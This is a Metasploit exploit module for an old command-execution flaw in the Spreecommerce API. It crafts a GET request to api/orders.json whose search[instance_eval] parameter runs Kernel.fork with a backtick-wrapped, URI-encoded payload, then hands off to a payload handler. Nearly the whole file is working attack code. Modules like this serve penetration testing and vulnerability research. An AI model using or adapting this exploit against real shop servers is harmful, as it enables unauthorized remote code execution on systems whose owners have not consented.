##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Spreecommerce Arbitrary Command Execution',
      'Description'    => %q{
          This module exploits an arbitrary command execution vulnerability in
          the Spreecommerce API searchlogic for versions 0.50.0 and earlier.
          Unvalidated input is called via the Ruby send method allowing command
          execution.
      },
      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #Phenoelit
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '71900'],
          [ 'URL', 'http://www.spreecommerce.com/blog/2011/04/19/security-fixes/' ],

        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'BadChars' => "\x60",
          'DisableNops' => true,
          'Space'       => 31337,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
            }
        },
      'Platform'       => %w{ linux unix },
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => '2011-04-19',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('URI', [true, "The path to the Spreecommerce main site", "/"]),
        ])
  end

  def exploit
    command = Rex::Text.uri_encode(payload.raw, 'hex-noslashes')

    urlconfigdir = normalize_uri(datastore['URI']) + '/' + "api/orders.json?search[instance_eval]=Kernel.fork%20do%60#{command}%60end"
    res = send_request_raw({
      'uri'     => urlconfigdir,
      'method'  => 'GET',
      'headers' =>
      {
        'HTTP_AUTHORIZATION' => 'ABCD', #needs to be present
        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Connection' => 'Close',
      }
    }, 0.4 ) #short timeout, we don't care about the response
    if (res)
      print_status("The server returned: #{res.code} #{res.message}")
    end
    handler
  end
end
